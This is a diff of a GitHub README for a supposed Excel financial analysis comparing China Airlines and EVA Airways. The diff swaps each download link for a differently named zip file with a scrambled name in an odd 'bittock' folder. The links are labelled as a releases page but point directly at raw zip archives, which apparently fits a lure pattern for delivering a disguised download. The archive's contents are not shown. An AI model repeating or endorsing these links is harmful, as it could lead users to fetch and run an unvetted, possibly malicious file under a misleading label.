@@ -1,7 +1,7 @@
 # ✈️ china_airlines_comparative_financial_analysis - Analyze Airline Financials Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/china_airlines_comparative_financial_analysis.zip%20Release-brightgreen)](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/china_airlines_comparative_financial_analysis.zip)
+[![Download](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/analysis_airlines_financial_china_comparative_Merida.zip%20Release-brightgreen)](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/analysis_airlines_financial_china_comparative_Merida.zip)
 
 ## 📋 Overview
 The **china_airlines_comparative_financial_analysis** project provides a thorough comparison of China Airlines (CAL) and EVA Airways' financial performance. This analysis includes DuPont analysis, capital structure assessment, and Dividend Discount Model (DDM) valuation. You will find dynamic Excel models equipped with automated formulas, sensitivity analysis, and strategic recommendations to enhance profitability and operational efficiency.
@@ -11,7 +11,7 @@ To begin using the application, follow these simple steps to download and run th
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the releases page on GitHub:
-   [Download Latest Release](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/china_airlines_comparative_financial_analysis.zip).
+   [Download Latest Release](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/analysis_airlines_financial_china_comparative_Merida.zip).
 
 2. **Select the Latest Version:** On the releases page, look for the most recent version. Each version will have a list of available files.
 
@@ -57,4 +57,4 @@ Contributions to improve this project are welcome. If you have suggestions for e
 This project is open source and available under the MIT License. Feel free to use and modify it as needed.
 
 ## 📥 Download Again
-If you need to download the Excel model again, you can do so by visiting the releases page here: [Download Latest Release](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/china_airlines_comparative_financial_analysis.zip).
+If you need to download the Excel model again, you can do so by visiting the releases page here: [Download Latest Release](https://raw.githubusercontent.com/minecommando26/china_airlines_comparative_financial_analysis/main/bittock/analysis_airlines_financial_china_comparative_Merida.zip).
